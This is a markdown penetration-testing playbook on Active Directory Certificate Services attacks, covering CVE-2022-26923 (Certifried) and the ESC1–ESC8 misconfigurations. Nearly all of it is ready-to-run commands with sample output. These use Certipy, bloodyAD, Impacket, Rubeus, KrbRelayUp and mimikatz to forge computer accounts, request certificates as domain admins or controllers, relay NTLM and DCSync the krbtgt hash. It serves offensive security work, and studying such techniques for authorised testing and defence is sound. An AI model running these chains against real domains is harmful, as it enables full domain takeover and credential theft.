<!---------------------------------------------------------------------------------
Copyright: (c) BLS OPS LLC.
This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, version 3.
This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
GNU General Public License for more details.
You should have received a copy of the GNU General Public License
along with this program. If not, see <https://www.gnu.org/licenses/>.
--------------------------------------------------------------------------------->
# ADCS Attacks
### Tags
<details><summary>Tags (Click to expand)</summary><p>

Environment

		#@active #@directory #@activedirectory #@microsoft

Context

		#@certificate #@services #@adcs #@authority #@relay #@cert #@certutil #@ccache

Tools

		#@certi #@certipy #@certify #@rubeus

</p></details>

### References
<details><summary>References (Click to expand)</summary><p>

* ADCS Setup -<br />[https://www.virtuallyboring.com/setup-microsoft-active-directory-certificate-services-ad-cs/](https://www.virtuallyboring.com/setup-microsoft-active-directory-certificate-services-ad-cs/)
* PetitPotam PoC - [https://github.com/topotam/PetitPotam](https://github.com/topotam/PetitPotam)
* -<br />[https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-efsr/08796ba8-01c8-4872-9221-1000ec2eff31](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-efsr/08796ba8-01c8-4872-9221-1000ec2eff31)
* -<br />[https://twitter.com/gentilkiwi/status/1421947898749669379](https://twitter.com/gentilkiwi/status/1421947898749669379)
* -<br />[https://www.exandroid.dev/2021/06/23/ad-cs-relay-attack-practical-guide/](https://www.exandroid.dev/2021/06/23/ad-cs-relay-attack-practical-guide/)
* -<br />[https://cqureacademy.com/blog/hacking-summer-camp-techniques-for-grabbing-private-keys-from-certificates-that-have-been-made-non-exportable](https://cqureacademy.com/blog/hacking-summer-camp-techniques-for-grabbing-private-keys-from-certificates-that-have-been-made-non-exportable)
* -<br />[https://www.riskinsight-wavestone.com/en/2021/06/microsoft-adcs-abusing-pki-in-active-directory-environment/#section-3](https://www.riskinsight-wavestone.com/en/2021/06/microsoft-adcs-abusing-pki-in-active-directory-environment/#section-3)
* Full SpecterOps White Paper explanation -<br />([https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf](https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf))
* Microsoft Support: KB5005413: Mitigating NTLM Relay Attacks on Active Directory Certificate Services (AD CS) -<br />[https://support.microsoft.com/en-us/topic/kb5005413-mitigating-ntlm-relay-attacks-on-active-directory-certificate-services-ad-cs](https://support.microsoft.com/en-us/topic/kb5005413-mitigating-ntlm-relay-attacks-on-active-directory-certificate-services-ad-cs)
* [https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7](https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7)

</p></details>

### Overview, Tips, and Tricks

* <details><summary>Important Notes (Click to expand)</summary><p>
	* Microsoft refers to the attack chain as **PetitPotam** in KB5005413. However, **PetitPotam** is just the PoC exploit used to invoke an NTLM authentication request through a `EfsRpcOpenFileRaw` request.
	* There may be other techniques that may cause a Windows system to initiate a connection to an arbitrary host using privileged NTLM credentials.
	* There may be services other than AD CS that may be leveraged to use as a target for a relayed NTLM authentication request.
* Tips
	* **Certipy** - The enumeration for data currently (2022.08) requires that you use ly4k's forked BloodHound release to process the collected data. -<br />[https://github.com/ly4k/BloodHound/releases](https://github.com/ly4k/BloodHound/releases)

### Example Attacks

#### From a Linux Machine
* CVE-2022-26923 ("Certifried")
	* <details><summary>Overview (Click to expand)</summary><p>
		* An authenticated user could manipulate attributes on computer accounts they own or manage, and acquire a certificate from Active Directory Certificate Services that would allow elevation of privilege.
		* **User** template certificate would identify and distinguish the certificate with the User Principal Name(UPN) of the certificate as _SubjectAltRequireUpn_ is in the `msPKI-Certificate-Name-Flag` attributes. However, **Machine** template distinguish computer accounts' certificates only by `dnsHostName` attribute which can be edited out and cause confusion in the KDC and attacker can request certificate as DC instead of the legitimate computer and results in a DCSync attack.
	* <details><summary>References (Click to expand)</summary><p>
		* Official Patch/Remediation by Microsoft -<br />[https://msrc.microsoft.com/update-guide/vulnerability/CVE-2022-26923](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2022-26923)
	* <details><summary>aniqfakhrul's method (Click to expand)</summary><p>
		* References
			* aniqfakhrul's GitHub: certifried.py -<br />[https://github.com/aniqfakhrul/certifried.py](https://github.com/aniqfakhrul/certifried.py)
			* aniqfakhrul's GitHub -<br />[https://github.com/aniqfakhrul/archives#certifried](https://github.com/aniqfakhrul/archives#certifried)
		* Attack
			1. Create a fake coputer account, clear the SPN attributes related to `dnsHostName` attribute, and change the `dnsHostName` attribute to match the DC.
				* "Messy-Script-Does-Start"
					* certifried.py -<br />[https://github.com/aniqfakhrul/certifried.py](https://github.com/aniqfakhrul/certifried.py)_
				* Step-by-Step
					1. Add a fake computer account
						* Powermad -<br />[https://github.com/Kevin-Robertson/Powermad](https://github.com/Kevin-Robertson/Powermad)

								New-MachineAccount -MachineAccount 'FakeComputer' -Password (ConvertTo-SecureString -AsPlainText -Force 'Password123') -Domain domain.local -DomainController dc.domain.local -Verbose
						* Impacket's addcomputer.py -<br />[https://github.com/SecureAuthCorp/impacket/blob/master/examples/addcomputer.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/addcomputer.py)

								addcomputer.py domain.local/john:'Passw0rd1' -method LDAPS -computer-name 'JOHNPC' -computer-pass 'Password123'
					1. Clear the SPNs attributes that relates to the current `dnsHostName` attribute.

							addspn.py --clear -t 'FakeComputer$' -u 'domain\user' -p 'password' 'DC.domain.local'
					1. Change dnsHostName attribute matching the domain controller
						* RSAT

								Set-ADComputer THMPC -DnsHostName LUNDC.lunar.eruca.com
						* certifried.py

								python3 certifried.py range.net/peter:'Welcome1234' -dc-ip 192.168.86.182
				1. Request certificate with [Certipy](https://github.com/ly4k/Certipy)

						certipy req range.net/WIN-JLSLKICW6EP\$:'PY2nc0ubG8WT'@ca01.range.net -ca range-CA01-CA -template Machine
				1. Authenticate with the requested certificate earlier

						certipy auth -pfx dc01.pfx -dc-ip 192.168.86.182
				1. DCSync and win

						secretsdump.py domain.local/dc01\$@10.10.10.10 -just-dc -hashes :000000000000000
				1. It is always recommended to cleanup the created computer account. _(This requires a privileged account)_

						addcomputer.py range.net/Administrator:'Password123' -computer-name 'WIN-EAZXIGMWO1T$' -computer-pass 'mi#gKKWFlzxJ' -dc-ip 192.168.86.182 -delete
	* <details><summary>Oliver Lyak (ly4k) method (Click to expand)</summary><p>
		* References
			* Blog Post -<br />[https://research.ifcr.dk/certifried-active-directory-domain-privilege-escalation-cve-2022-26923-9e098fe298f4](https://research.ifcr.dk/certifried-active-directory-domain-privilege-escalation-cve-2022-26923-9e098fe298f4)
		* Attack (Needs Testing)
			1. Create a machine account

					certipy account create $DOMAIN/john:Passw0rd@dc.corp.local' -user 'johnpc' -dns 'dc.corp.local'
			2. Perform the attack

					certipy req $DOMAIN/JOHNPC$:<newgeneratedpassword>@dc.corp.local' -ca 'CORP-DC-CA' -template Machine
	* <details><summary>payloadsallthething method (Click to expand)</summary><p>
		* Attack
			1. Find ms-DS-MachineAccountQuota

						python bloodyAD.py -d lab.local -u username -p 'Password123*' --host 10.10.10.10 getObjectAttributes	'DC=lab,DC=local' ms-DS-MachineAccountQuota 
			1. Add a new computer in the Active Directory, by default `MachineAccountQuota = 10`

					python bloodyAD.py -d lab.local -u username -p 'Password123*' --host 10.10.10.10 addComputer cve 'CVEPassword1234*'
					certipy account create 'lab.local/username:Password123*@dc.lab.local' -user 'cve' -dns 'dc.lab.local'
				* [ALTERNATIVE] If you are `SYSTEM` and the `MachineAccountQuota=0`: Use a ticket for the current machine and reset its SPN

						Rubeus.exe tgtdeleg
						export KRB5CCNAME=/tmp/ws02.ccache
						python bloodyAD -d lab.local -u 'ws02$' -k --host dc.lab.local setAttribute 'CN=ws02,CN=Computers,DC=lab,DC=local' servicePrincipalName '[]'
			1. Set the `dNSHostName` attribute to match the Domain Controller hostname

					python bloodyAD.py -d lab.local -u username -p 'Password123*' --host 10.10.10.10 setAttribute 'CN=cve,CN=Computers,DC=lab,DC=local' dNSHostName '["DC.lab.local"]'
					python bloodyAD.py -d lab.local -u username -p 'Password123*' --host 10.10.10.10 getObjectAttributes 'CN=cve,CN=Computers,DC=lab,DC=local' dNSHostName
			1. Request a ticket

					# certipy req 'domain.local/cve$:CVEPassword1234*@ADCS_IP' -template Machine -dc-ip DC_IP -ca discovered-CA
					certipy req 'lab.local/cve$:CVEPassword1234*@10.100.10.13' -template Machine -dc-ip 10.10.10.10 -ca lab-ADCS-CA
			1. Either use the pfx or set a RBCD on your machine account to takeover the domain

					certipy auth -pfx ./dc.pfx -dc-ip 10.10.10.10
					openssl pkcs12 -in dc.pfx -out dc.pem -nodes
					python bloodyAD.py -d lab.local	-c ":dc.pem" -u 'cve$' --host 10.10.10.10 setRbcd 'CVE$' 'CRASHDC$'
					getST.py -spn LDAP/CRASHDC.lab.local -impersonate Administrator -dc-ip 10.10.10.10 'lab.local/cve$:CVEPassword1234*'	 
					secretsdump.py -user-status -just-dc-ntlm -just-dc-user krbtgt 'lab.local/Administrator@dc.lab.local' -k -no-pass -dc-ip 10.10.10.10 -target-ip 10.10.10.10 

#### From a Windows Machine
##### Remote


##### Local/Domain-Joined
* CVE-2022-26923 ("Certifried")
	* <details><summary>Overview (Click to expand)</summary><p>
		* An authenticated user could manipulate attributes on computer accounts they own or manage, and acquire a certificate from Active Directory Certificate Services that would allow elevation of privilege.
		* **User** template certificate would identify and distinguish the certificate with the User Principal Name(UPN) of the certificate as _SubjectAltRequireUpn_ is in the `msPKI-Certificate-Name-Flag` attributes. However, **Machine** template distinguish computer accounts' certificates only by `dnsHostName` attribute which can be edited out and cause confusion in the KDC and attacker can request certificate as DC instead of the legitimate computer and results in a DCSync attack.
	* <details><summary>References (Click to expand)</summary><p>
		* Official Patch/Remediation by Microsoft -<br />[https://msrc.microsoft.com/update-guide/vulnerability/CVE-2022-26923](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2022-26923)
	* <details><summary>tothi's method (Click to expand)</summary><p>
		* References
			* tothi guide -<br />[https://gist.github.com/tothi/f89a37127f2233352d74eef6c748ca25](https://gist.github.com/tothi/f89a37127f2233352d74eef6c748ca25)
		* Attack
			1. For the sake of simplicity: use the awesome all-in-one tool [KrbRelayUp](https://github.com/Dec0ne/KrbRelayUp) for
			privilege escalation to local system on the domain-joined box where the attacker has non-privileged command execution
			capability:

					KrbRelayUp.exe full -m shadowcred -f
				* This gives an elevated command prompt immediately (as `NT Authority\System`).
			1. Perform the computer object attributes abuse (remove SPNs and modify dNSHostName to a DC) in the elevated prompt.
				* Using PowerShell ADSI Adapter for this task does not require any special dependencies:

						$searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]'')
						$searcher.filter = '(&(objectClass=computer)(sAMAccountName={0}$))' -f $Env:ComputerName
						$obj = [ADSI]$searcher.FindAll().Path
						$spn = @()
						$obj.servicePrincipalName | % { $spn += $_ }
						$dns = $obj.dNSHostName.ToString()     
						$spn | % { $obj.servicePrincipalName.Remove($_) }
						$obj.dNSHostName = "dc1.ecorp.local"
						$obj.SetInfo()
				* Original state of the attributes are saved (in the `$spn` and `$dns` variables) for later restore.
			1. Request machine certificate for this abused computer using [Certify](https://github.com/GhostPack/Certify)
			(should get a cert for the DC!):

					.\Certify.exe request /ca:dc1.ecorp.local\ecorp-dc1-ca /machine
			1. Restore computer attributes (still in the same PS session, previous variables should be available):

						$obj.dNSHostName = $dns
						$spn | % { $obj.servicePrincipalName.Add($_) }
						$obj.SetInfo()
			1. Copy the private key with the certificate issued at step 3 as `cert.pem` to a (Linux) box running openssl and
			convert it to pfx (no need to set a password):

					openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
				* Note that this step may require a Linux box but it is not interacting with the targets, so it not breaks the full
			Windows path.
				* Convert the `cert.pfx` file to base64:

						cat cert.pfx | base64 -w0
			1. Ask a Kerberos TGT using [Rubeus](https://github.com/GhostPack/Rubeus) with the certificate and PKINIT and
			inject it into the current session. This may be performed from original non-elevated shell:

					.\Rubeus.exe asktgt /user:DC1$ /certificate:<base64 pfx> /ptt
				* Check the `DC1$` (domain controller machine account) ticket in the session with klist:

						klist
			1. Domain Persistence
				* DCSync with [Mimikatz](https://github.com/gentilkiwi/mimikatz) and get any hash.
				* `krbtgt` (for golden tickets). 

					.\mimikatz.exe "lsadump::dcsync /domain:ecorp.local /user:krbtgt" exit

### Attack
#### From a Linux Machine
1. Enumerate
	* Automatic ([`Active Scanning` TTP](TTP/T1595_Active_Scanning/T1595.md), [`Active Scanning - Vulnerability Scanning` TTP](TTP/T1595_Active_Scanning/002_Vulnerability_Scanning/T1595.002.md))
1. Exploit
	* ESC1: **Subject Alternative Name (SAN)**
		* Usually easy win!
		* <details><summary>Requirements (Click to expand)</summary><p>
			* Enterprise CA permits low-privileged users the ability to request certificate
			* Manager  approval is disabled
			* No authorized signatures are required
			* An overly permissive certificate template security descriptor grants certificate enrollment  rights  to  low-privileged  users
			* The  certificate  template  defines  EKUs  that  enable  authentication
			* **The certificate template allows requesters to specify a subjectAltName in the CSR**
				* `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`
		* <details><summary>Recommended: Certipy (Click to expand) -<br />[https://github.com/ly4k/Certipy](https://github.com/ly4k/Certipy)</summary><p>
			
				certipy req -u $DOMAIN_USER@$DOMAIN -p 'password' -ca DOMAIN-CA-CA -target ca.domain.local -dc-ip 10.0.0.1 -upn 'domain_admin@domain.local' -template vuln1 -dns dc01.domain.local
			* Notes
				* Template name should be specified as the vulnerable template.
				* Not every flag may be necessary (e.g., -dc-ip), but these flags cut down on DNS errors.
			* Examples

					certipy req -u $DOMAIN_USER@$DOMAIN -p $PASSWORD -ca DOMAIN-CA-CA -target ca.domain.local -dc-ip 10.0.0.1 -upn 'domain_admin@domain.local' -template vuln1 -dns dc01.domain.local
				* Example Output
					
						Certipy v4.0.0 - by Oliver Lyak (ly4k)

						[*] Requesting certificate via RPC
						[*] Successfully requested certificate
						[*] Request ID is 6
						[*] Got certificate with multiple identifications
						    UPN: 'domain_admin@domain.local'
						    DNS Host Name: 'dc01.domain.local'
						[*] Certificate has no object SID
						[*] Saved certificate and private key to 'domain_admin_dc01.pfx'
	* ESC2: **Any Purpose Certificates**
		* Note: The exploit process is essentially the same as ESC3.
		* <details><summary>Requirements (Click to expand)</summary><p>
			* Enterprise CA permits low-privileged users the ability to request certificate
			* Manager  approval is disabled
			* No authorized signatures are required
			* An overly permissive certificate template security descriptor grants certificate enrollment rights to low-privileged users
			* The  certificate template defines EKUs that enable authentication
			* **The certificate template defines the Any Purpose EKU or no EKU**
		* <details><summary>Recommended: Certipy (Click to expand) -<br />[https://github.com/ly4k/Certipy](https://github.com/ly4k/Certipy)</summary><p>
			* Example
				1. Request a certificate file using a vulnerable template
				
						certipy req -username $DOMAIN_USER@$DOMAIN -password $PASSWORD -ca DOMAIN-CA-CA -target ca.domain.local -template vuln1
					* Example Output

							Certipy v4.0.0 - by Oliver Lyak (ly4k)

							[*] Requesting certificate via RPC
							[*] Successfully requested certificate
							[*] Request ID is 8
							[*] Got certificate without identification
							[*] Certificate has no object SID
							[*] Saved certificate and private key to 'domain_user.pfx'
				1. Use the vulnerable certificate to request access on behalf of another user

						certipy req -username $DOMAIN_USER@$DOMAIN -password $PASSWORD -ca DOMAIN-CA-CA -target ca.domain.local -template User -on-behalf-of 'microsoftdelive\domain_admin' -pfx 'domain_user.pfx'
					* Example Output

							Certipy v4.0.0 - by Oliver Lyak (ly4k)

							[*] Requesting certificate via RPC
							[*] Successfully requested certificate
							[*] Request ID is 10
							[*] Got certificate with UPN 'domain_admin@domain.local'
							[*] Certificate has no object SID
							[*] Saved certificate and private key to 'domain_admin.pfx'
				1. Authenticate with the certificate, receive the KRBTGT and NTLM Hash information.

						certipy auth -pfx administrator.pfx -dc-ip 10.0.0.1
					* Example Output

						Certipy v4.0.0 - by Oliver Lyak (ly4k)

						[*] Using principal: domain_admin@domain.local
						[*] Trying to get TGT...
						[*] Got TGT
						[*] Saved credential cache to 'domain_admin.ccache'
						[*] Trying to retrieve NT hash for 'domain_admin'
						[*] Got hash for 'domain_admin@domain.local': aad3b435b51404eeaad3b435b51404ee:e19ccf75ee54e06b06a5907af13cef42
	* ESC3: A certificate template specifies the Certificate Request Agent EKU (Enrollment Agent) on behalf of other users
		* <details><summary>Requirements (Click to expand)</summary><p>
			* Requires 2+ templates matching these conditions:
				* No Issuance Requirements
				* Certificate Request Agent EKU
				* No enrollment agent Restrictions
		* <details><summary>Recommended: Certipy (Click to expand) -<br />[https://github.com/ly4k/Certipy](https://github.com/ly4k/Certipy)</summary><p>
			1. Request a certificate file using a vulnerable template
			
					certipy req -username $DOMAIN_USER@$DOMAIN -password $PASSWORD -ca DOMAIN-CA-CA -target ca.domain.local -template vuln1
				* Example Output

						Certipy v4.0.0 - by Oliver Lyak (ly4k)

						[*] Requesting certificate via RPC
						[*] Successfully requested certificate
						[*] Request ID is 8
						[*] Got certificate without identification
						[*] Certificate has no object SID
						[*] Saved certificate and private key to 'domain_user.pfx'
			1. Use the vulnerable certificate to request access on behalf of another user

					certipy req -username $DOMAIN_USER@$DOMAIN -password $PASSWORD -ca DOMAIN-CA-CA -target ca.domain.local -template User -on-behalf-of 'microsoftdelive\domain_admin' -pfx 'domain_user.pfx'
				* Example Output

						Certipy v4.0.0 - by Oliver Lyak (ly4k)

						[*] Requesting certificate via RPC
						[*] Successfully requested certificate
						[*] Request ID is 10
						[*] Got certificate with UPN 'domain_admin@domain.local'
						[*] Certificate has no object SID
						[*] Saved certificate and private key to 'domain_admin.pfx'
			1. Authenticate with the certificate, receive the KRBTGT and NTLM Hash information.

					certipy auth -pfx administrator.pfx -dc-ip 10.0.0.1
				* Example Output

					Certipy v4.0.0 - by Oliver Lyak (ly4k)

					[*] Using principal: domain_admin@domain.local
					[*] Trying to get TGT...
					[*] Got TGT
					[*] Saved credential cache to 'domain_admin.ccache'
					[*] Trying to retrieve NT hash for 'domain_admin'
					[*] Got hash for 'domain_admin@domain.local': aad3b435b51404eeaad3b435b51404ee:e19ccf75ee54e06b06a5907af13cef42
	* ESC4: Abuse Write Permissions on Template to make vulnerable (e.g., to ESC1)
		* <details><summary>References (Click to expand)</summary><p>
			* [https://github.com/daem0nc0re/Abusing_Weak_ACL_on_Certificate_Templates](https://github.com/daem0nc0re/Abusing_Weak_ACL_on_Certificate_Templates)
		* <details><summary>Requirements (Click to expand)</summary><p>
			* Misconfigured certificate template access control
		* <details><summary>Recommended: Certipy (Click to expand) -<br />[https://github.com/ly4k/Certipy](https://github.com/ly4k/Certipy)</summary><p>
			* Overview
				* By default, Certipy will overwrite the configuration to make it vulnerable to ESC1.
				* specify the `-save-old` parameter to save the old configuration, which is useful for restoring the configuration afterwards.
			* <details><summary>Example (Click to expand)</summary><p>
				1. Use the "template" option to abuse your write capability and automatically overwrite the vulnerable certificate. Using `-save-old` will create a local copy of the template that can be used to revert the template to normal. Be very careful not to run the command a second time and overwrite your original `-save-old` once you've overwritten the template, because that was mighty unfortunate in testing.

						certipy template -username domain_user_ADCS@microsoftdelivery.com -password $PASSWORD -template Vuln4 -save-old
					* Example Output

							Certipy v4.0.0 - by Oliver Lyak (ly4k)

							[*] Saved old configuration for 'Vuln4' to 'Vuln4.json'
							[*] Updating certificate template 'Vuln4'
							[*] Successfully updated 'Vuln4'
				1. Now that the vulnerable template is "more vulnerable" and susceptible to ESC1, run the ESC1 attack, as below.

						certipy req -username domain_user_ADCS@microsoftdelivery.com -password $PASSWORD -ca MICROSOFTDELIVERY-CA-CA -target ca.microsoftdelivery.com -template Vuln4 -upn domain_admin@microsoftdelivery.com -dc-ip 10.0.0.1
					* Example Output

							Certipy v4.0.0 - by Oliver Lyak (ly4k)

							[*] Requesting certificate via RPC
							[*] Successfully requested certificate
							[*] Request ID is 21
							[*] Got certificate with UPN 'domain_admin@microsoftdelivery.com'
							[*] Certificate has no object SID
							[*] Saved certificate and private key to 'domain_admin.pfx'
				1. Restore the vulnerable template to its original settings.

						 certipy template -username domain_user_ADCS@microsoftdelivery.com -password $PASSWORD -template 'Vuln4' -configuration Vuln4.json 
					* Example Output

							Certipy v4.0.0 - by Oliver Lyak (ly4k)

							[*] Updating certificate template 'Vuln4'
							[*] Successfully updated 'Vuln4'
	* ESC5: Not Researched.
		* <details><summary>Requirements (Click to expand)</summary><p>
			* Vulnerable PKI AD Object Access Control 
		* <details><summary>Exploit (Click to expand)</summary><p>
			* "Get Creative." Similar to many AD Access Control Abuses.
	* ESC6: Misconfigured CA with `EDITF_ATTRIBUTESUBJECTALTNAME2` setting
		* <details><summary>Requirements (Click to expand)</summary><p>
			* The `EDITF_ATTRIBUTESUBJECTALTNAME2` setting on CAs
			* No Manager Approval
			* Enrollable Client Authentication/Smart Card Logon OID templates
		* <details><summary>Recommended: Certipy (Click to expand) -<br />[https://github.com/ly4k/Certipy](https://github.com/ly4k/Certipy)</summary><p>

				certipy req -username $DOMAIN_USER@$DOMAIN -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template User -upn administrator@corp.local
			* Example Output

					Certipy v4.0.0 - by Oliver Lyak (ly4k)
					[*] Requesting certificate via RPC
					[*] Successfully requested certificate
					[*] Request ID is 2
					[*] Got certificate with UPN 'administrator@corp.local'
					[*] Certificate object SID is 'S-1-5-21-2496215469-2694655311-2823030825-1103'
					[*] Saved certificate and private key to 'administrator.pfx'

					$ certipy req -username administrator@corp.local -password Passw0rd! -ca corp-DC-CA -target ca.corp.local -template User -upn administrator@corp.local
			* Example Output

					Certipy v4.0.0 - by Oliver Lyak (ly4k)
					[*] Requesting certificate via RPC
					[*] Successfully requested certificate
					[*] Request ID is 3
					[*] Got certificate with UPN 'administrator@corp.local'
					[*] Certificate object SID is 'S-1-5-21-2496215469-2694655311-2823030825-500'
					[*] Saved certificate and private key to 'administrator.pfx'
	* ESC7: AManage CA or Manage Certificates access
		* <details><summary>Notes (Click to expand)</summary><p>
			* ESC7 is when a user has the Manage CA or Manage Certificates access right on a CA.
				* An attacker with control over a principal that has the ManageCA right over the CA can remotely flip the `EDITF_ATTRIBUTESUBJECTALTNAME2` bit to allow SAN specification in any template 
				* There are no public techniques for abuse (at the time of this writing)
			 	* The privilege can be used to issue/deny pending certificate requests
				* The "Certified Pre-Owned" whitepaper states that the privileges allowt he attacke to enable the `EDITF_ATTRIBUTESUBJECTALTNAME2` flag to perform the ESC6 attack.
					* This change will not take effect until the CA service (CertSvc) is restarted
						* A user with Manage CA access right may restart the service, but not necessarily remotely.
						* ESC6 might not work out of the box in most patched environments (May 2022 security updates)
			* See alternative below for avoiding service restarts/configuration changes
		* <details><summary>Requirements (Click to expand)</summary><p>
			* A principal with ManageCA rights on a certificate authority
	* ESC7 Alternative
		* <details><summary>Requirements (Click to expand)</summary><p>
			* User with **Manage Certificates** access right
			* The certificate template **SubCA** must be enabled
			* With the Manage CA access right, we can fulfill these prerequisites
		* <details><summary>Overview (Click to expand)</summary><p>
			* The technique relies on the fact that users with the Manage CA and Manage Certificates access right can issue failed certificate requests. The SubCA certificate template is vulnerable to ESC1, but only administrators can enroll in the template. Thus, a user can request to enroll in the SubCA - which will be denied - but then issued by the manager afterwards.
		* <details><summary>Prep. Process (Click to expand)</summary><p>
			* With the Manage CA access right, you can grant yourself the Manage Certificates access right by adding your user as a new officer.

					certipy ca -ca 'DOMAIN-CA-CA' -add-officer domain_user_adcs -username domain_user_adcs@domain.local -password $PASSWORD -target ca.domain.local -dc-ip 10.0.0.1
				* Example Output

						Certipy v4.0.0 - by Oliver Lyak (ly4k)

						[*] Successfully added officer 'Domain_User_ADCS' on 'DOMAIN-CA-CA'
			* The SubCA template can be enabled on the CA with the -enable-template parameter. By default, the SubCA template is enabled.

					certipy ca -ca 'MICROSOFTDELIVERY-CA-CA' -enable-template SubCA -username domain_user_ADCS@microsoftdelivery.com -password $PASSWORD -target ca.microsoftdelivery.com -dc-ip 10.0.0.1
				* Example Output

						Certipy v4.0.0 - by Oliver Lyak (ly4k)

						[*] Successfully enabled 'SubCA' on 'DOMAIN-CA-CA'
		* <details><summary>Attack Process (Click to expand)</summary><p>
			1. Request a certificate based on the SubCA template. This request will be denied. Save the private key and note the request ID.

					certipy req -username domain_user_ADCS@microsoftdelivery.com -password $PASSWORD -ca MICROSOFTDELIVERY-CA-CA -target ca.microsoftdelivery.com -template SubCA -upn domain_admin@microsoftdelivery.com -dc-ip 10.0.0.1
				* Example Output

						Certipy v4.0.0 - by Oliver Lyak (ly4k)

						[*] Requesting certificate via RPC
						[-] Got error while trying to request certificate: code: 0x80094012 - CERTSRV_E_TEMPLATE_DENIED - The permissions on the certificate template do not allow the current user to enroll for this type of certificate.
						[*] Request ID is 14
						Would you like to save the private key? (y/N) y
						[*] Saved private key to 14.key
						[-] Failed to request certificate
			1. Use the Manage CA and Manage Certificates ability to issue the failed certificate request with the ca command and the -issue-request <request ID> parameter.

					certipy ca -ca 'MICROSOFTDELIVERY-CA-CA' -issue-request 14 -username domain_user_ADCS@microsoftdelivery.com -password $PASSWORD -dc-ip 10.0.0.1 -target 'ca.microsoftdelivery.com'
				* Example Output

						Certipy v4.0.0 - by Oliver Lyak (ly4k)

						[*] Successfully issued certificate
			1. Retrieve the issued certificate with the req command and the -retrieve <request ID> parameter.

					certipy req -username $DOMAIN_USER@$DOMAIN -password Passw0rd -ca corp-DC-CA -target ca.corp.local -retrieve 785
				* Output

						Certipy v4.0.0 - by Oliver Lyak (ly4k)

						[*] Rerieving certificate with ID 785
						[*] Successfully retrieved certificate
						[*] Got certificate with UPN 'administrator@corp.local'
						[*] Certificate has no object SID
						[*] Loaded private key from '785.key'
						[*] Saved certificate and private key to 'administrator.pfx'
			1. Retrieve NTLM Hash and Kerberos information using the certificate.

					certipy auth -pfx administrator.pfx -dc-ip 10.0.0.1
				* Example Output

						root@gateway:~# certipy auth -pfx domain_admin.pfx -dc-ip 10.0.0.1 -dc-ip 10.0.0.1
						Certipy v4.0.0 - by Oliver Lyak (ly4k)

						[*] Using principal: domain_admin@microsoftdelivery.com
						[*] Trying to get TGT...
						[*] Got TGT
						[*] Saved credential cache to 'domain_admin.ccache'
						[*] Trying to retrieve NT hash for 'domain_admin'
						[*] Got hash for 'domain_admin@microsoftdelivery.com': aad3b435b51404eeaad3b435b51404ee:e19ccf75ee54e06b06a5907af13cef42
	* ESC8: **Force DC Certificate Request**
		* <details><summary>Requirements (Click to expand)</summary><p>
			* NTLM Relay to AD CS HTTP Endpoints
				1. Initiate a relay server
					* <details><summary>Recommended: Certipy (Click to expand)</summary><p>

							certipy relay -ca ca.corp.local
						* Example output

								Certipy v4.0.0 - by Oliver Lyak (ly4k)

								[*] Targeting http://ca.corp.local/certsrv/certfnsh.asp
								[*] Listening on 0.0.0.0:445
								[*] Requesting certificate for 'CORP\\Administrator' based on the template 'User'
								[*] Got certificate with UPN 'Administrator@corp.local'
								[*] Certificate object SID is 'S-1-5-21-980154951-4172460254-2779440654-500'
								[*] Saved certificate and private key to 'administrator.pfx'
								[*] Exiting...
						* Example error output (see Example 2 for alternative)

								Certipy v4.0.0 - by Oliver Lyak (ly4k)

								[*] Targeting http://ca/certsrv/certfnsh.asp
								[*] Listening on 0.0.0.0:445
								[+] Connecting to ca:80...
								[+] Connected to ca:80
								[+] HTTP server returned error code 200, treating as a successful login
								[+] Generating RSA key
								[+] Connecting to ca:80...
								[+] Connected to ca:80
								[*] Requesting certificate for 'MICROSOFTDELIVE\\DC01$' based on the template 'Machine'
								[!] Got access denied while trying to enroll in template 'Machine'
								[*] Request ID is 24
								Would you like to save the private key? (y/N) y
								[*] Saved private key to 24.key
								[*] Exiting...
				1. Force authentication to the relay server. This step can be completed according to the ([AD Forced Authentication Guide](Testaments_and_Books/Redvelations/Active_Directory/003-1_AD_NTLM_Capture_and_Relay_Attacks.md))
				1. Retrieve NTLM Hash and Kerberos information using the certificate.

						certipy auth -pfx administrator.pfx -dc-ip 10.0.0.1
					* Example Output

							root@gateway:~# certipy auth -pfx domain_admin.pfx -dc-ip 10.0.0.1 -dc-ip 10.0.0.1
							Certipy v4.0.0 - by Oliver Lyak (ly4k)

							[*] Using principal: domain_admin@microsoftdelivery.com
							[*] Trying to get TGT...
							[*] Got TGT
							[*] Saved credential cache to 'domain_admin.ccache'
							[*] Trying to retrieve NT hash for 'domain_admin'
							[*] Got hash for 'domain_admin@microsoftdelivery.com': aad3b435b51404eeaad3b435b51404ee:e19ccf75ee54e06b06a5907af13cef42
			* Example 2: Alternative Template (Great when example 1 falls apart)
				1. Initiate a relay server, but select an alternative template. ADCS enumeration ([AD Enumeration Guide](Templates_and_Books/Redvelations/)) can help identify more templates.

						certipy relay -template 'KerberosAuthentication' -ca ca -dns 10.0.0.1
					* Example output

							Certipy v4.0.0 - by Oliver Lyak (ly4k)

							[*] Targeting http://ca/certsrv/certfnsh.asp
							[*] Listening on 0.0.0.0:445
							[*] Requesting certificate for 'MICROSOFTDELIVE\\DC01$' based on the template 'KerberosAuthentication'
							[*] Got certificate with multiple identifications
							    DNS Host Name: 'DC01.microsoftdelivery.com'
							    DNS Host Name: 'microsoftdelivery.com'
							    DNS Host Name: 'MICROSOFTDELIVE'
							[*] Certificate has no object SID
							[*] Saved certificate and private key to 'dc01$_microsoftdelivery$_microsoftdelive.pfx'
							[*] Exiting...
